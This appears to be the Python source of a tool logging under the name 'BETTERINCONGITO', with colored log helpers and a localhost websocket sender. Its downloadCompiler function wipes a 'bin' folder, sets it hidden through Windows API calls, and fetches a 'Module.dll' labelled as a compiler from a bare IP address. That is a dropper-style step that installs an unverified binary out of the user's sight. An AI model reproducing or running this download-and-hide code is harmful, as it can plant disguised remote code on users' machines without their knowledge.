import colorama
import websocket
import time
import os
import ctypes
import shutil
import urllib.request
from colorama import Fore, Style

colorama.init(autoreset=True)

debugmode = True
threaddebugmode = False
debugmode2 = True

def get_current_time():
    return Fore.LIGHTBLACK_EX + time.strftime("[%H:%M:%S]", time.localtime()) + Style.RESET_ALL

def debug(*args, **kwargs):
    if debugmode:
        print(Fore.YELLOW + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def bridge(*args, **kwargs):
    if debugmode:
        print("")
        print(Fore.LIGHTYELLOW_EX + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def info(*args, **kwargs):
    if debugmode:
        print(Fore.BLUE + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def error(*args, **kwargs):
    if debugmode:
        print(Fore.RED + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def offset(*args, **kwargs):
    if debugmode:
        print(Fore.GREEN + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def printthread(*args, **kwargs):
    if threaddebugmode:
        print(Fore.MAGENTA + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)

def printsinglethread(*args, **kwargs):
    if debugmode and not threaddebugmode:
        print("")
        print(Fore.MAGENTA + "[BETTERINCONGITO]", get_current_time(), *args, **kwargs)
        print("")

def send_message(message):
    if not debugmode2:
        try:
            ws = websocket.create_connection("ws://localhost:8060/ws/")
            ws.send(message)
            ws.close()
        except Exception as e:
            error("IMPORTANT ERROR WHILE SENDING MESSAGE:", e)
            time.sleep(1)
            send_message(message)

def downloadCompiler():
    def set_hidden_attribute(file_path):
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)

    def download_file(url, file_name, target_dir):
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)
            set_hidden_attribute(target_dir)
        else:
            shutil.rmtree(target_dir)
            os.makedirs(target_dir)
            set_hidden_attribute(target_dir)
        
        target_file_path = os.path.join(target_dir, file_name)
        urllib.request.urlretrieve(url, target_file_path)

    if not debugmode2:
        info("Downloading Compiler")
        download_file('http://185.219.84.198/Module.dll', 'Module.dll', 'bin')
        info("Finished downloading Compiler")
    else:
        info("Skipping Compiler Download")
